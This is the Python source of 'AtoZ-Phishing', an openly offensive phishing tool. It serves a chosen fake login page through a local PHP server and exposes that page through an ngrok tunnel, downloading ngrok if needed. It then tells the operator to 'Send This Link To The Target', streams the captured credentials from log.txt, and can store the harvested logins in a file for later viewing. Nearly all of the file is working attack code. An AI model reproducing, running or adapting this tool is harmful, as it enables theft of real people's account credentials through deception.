import requests , os
import wget
import re
import sys

red="\033[1;31;40m"
green="\033[1;32;40m"
yellow="\033[1;33;40m"
purple="\033[1;34;40m"
pink="\033[1;35;40m"
blue="\033[1;36;40m"

def banner():
	os.system("clear")
	print(f"""{blue}
{red} █████╗ ████████╗ ██████╗ ███████╗    {yellow} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
{red}██╔══██╗╚══██╔══╝██╔═══██╗╚══███╔╝    {yellow} ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
{red}███████║   ██║   ██║   ██║  ███╔╝█████╗{yellow}██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
{red}██╔══██║   ██║   ██║   ██║ ███╔╝ ╚════╝{yellow}██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
{red}██║  ██║   ██║   ╚██████╔╝███████╗    {yellow} ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
{red}╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝     {yellow}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
			{blue}Created By {pink}Technical Dangwal                                                                                                


			{green}Help - show options

""")
dict={}
def show_folder():
	show=os.listdir("sites")
	for count,folder in enumerate(show,1):
		dict[count]=folder
def start_server(id):
	os.system("clear")
	print(f"{yellow}Starting PHP Server")
	os.chdir(f"sites/{dict[id]}")
	os.system("php -S localhost:4444  > /dev/null 2>&1 &")

def start_ngrok(path):
	try:
		os.chdir(path)
		if os.path.isfile("ngrok"):
			print(f"{yellow}Starting Ngrok Server ")
			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
			os.system("sleep 5")
			r=requests.get("http://localhost:4040/api/tunnels")
			url=re.compile(r"https://\w*.ngrok.io")
			url=url.findall(r.text)
			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")
		else:
			wget.download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
			os.system("unzip ngrok*")
			os.system("rm ngrok-stable-linux-arm.zip")
			print(f"{yellow}Starting Ngrok Server ")
			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
			os.system("sleep 5")
			r=requests.get("http://localhost:4040/api/tunnels")
			url=re.compile(r"https://\w*.ngrok.io")
			url=url.findall(r.text)
			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")
	except:
		print(f"{red}Please Open Your Hotspot Otherwise You Cann't get link ")

def get_cred(id):
	os.chdir(f"sites/{dict[id]}")
	print(f"{red}[{blue}*{red}] {green} Waiting Credentials , {blue}Press ctrl+c To Exit")
	try:
		while(True):
			if os.path.isfile("log.txt"):
				os.system("tail -f log.txt")
	except:
		os.system("killall -9 php > /dev/null 2>&1 &")
		os.system("killall -9 ngrok > /dev/null 2>&1 &")
		file=input(f"{yellow}Are you want to save this credential on a file (Y/N): {green}")
		if file=="Y" or file=="y":
			file=input(f"{yellow}filename: {green}")
			os.system(f"mv log.txt {file}")
			os.system(f"mv {file} $HOME/AtoZ-Phishing/files")
			print(f"{yellow}Thanks For Using This Tool.\033[0m")
			sys.exit()
		else:
			try:
				os.remove("log.txt")
				print(f"{yellow}Thanks For Using This Tool.\033[0m")
				sys.exit()
			except:
				pass
banner()
p=os.getcwd()
while(1):
	try:
		user=input(f"{blue}AtoZ-Phishing =>{green} ")
		user=user.strip()
		if user=="Help" or user=="help":
			print(f"""{red}search: {blue}By typing search you can find whatever you want related to phishing sites (example: searching instagram)
{red}show: {blue}show all phishing sites
{red}start: {blue}Start attack (example 
{blue}AtoZ-Phishing => {green}start 
{yellow}No.: {green}Type the number according to given sequence (by type show in terminal)
{red}id: {blue}It show your save ids
{red}removeid: {blue}If you want to remove your save ids then type removeids
{red}exit: {blue}Want to exit then write exit.
{red}uninstall: {blue}if you want to delete this tool then type uninstall and here it is done.
{red}subscribe: {blue}You can enter into my channel by easily type subscribe.
	""")
		elif user=="show" or user=="Show":
			show_folder()
			for count,file in dict.items():
				print(f"{red}[{green}{count}{red}] {yellow}{file}")
		elif user=="exit" or user=="Exit":
			print(f"{yellow}Thanks For Using This Tool.\033[0m")
			break
		elif user=="search" or user=="Search":
			print(f"{yellow}[00] Back")
			search=input(f"{yellow}Search: {green}")
			show_folder()
			if search==00 or search==0:
				continue
			print(f"{yellow}Number  phishingSites")
			for key,value in dict.items():
				r=re.findall(search+".*",value)
				if r:
					print(f"{yellow}{key} {red} {r}")
		elif user=="start" or user=="Start":
			print(f"{yellow}[00] Back")
			id=int(input(f"{yellow}No.: {green}"))
			if id==00 or id==0:
				continue
			show_folder()
			start_server(id)
			start_ngrok(p)
			get_cred(id)
		elif user=="id" or user=="Id":
			os.system("cat $HOME/AtoZ*/files/*")
		elif user=="removeid":
				os.system("rm $HOME/AtoZ*/files/*")
		elif user=="uninstall" or user=="Uninstall":
			os.system("rm -rf $HOME/a")
			break
		elif user=="Subscribe" or user=="subscribe":
			os.system("termux-open-url https://www.youtube.com/channel/UCpFKalNOjvtB8Cnm40VGq2Q")
		else:
			print(f"{red}Wrong Input")
	except:
		pass
